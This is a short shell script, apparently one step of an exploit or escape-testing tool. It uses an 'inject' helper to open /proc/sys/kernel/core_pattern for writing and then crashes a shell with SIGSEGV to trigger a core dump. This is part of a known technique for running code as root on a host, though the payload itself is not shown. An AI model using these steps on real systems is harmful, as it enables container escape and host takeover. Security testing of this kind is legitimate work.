#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../tool.sh"

# Open the core_pettern file with write permissions
inject "exec 3>/proc/sys/kernel/core_pattern"

# Create a shell and kill itself with SIGSEGV to trigger a coredump
inject "sh -c 'kill -11 $$'"
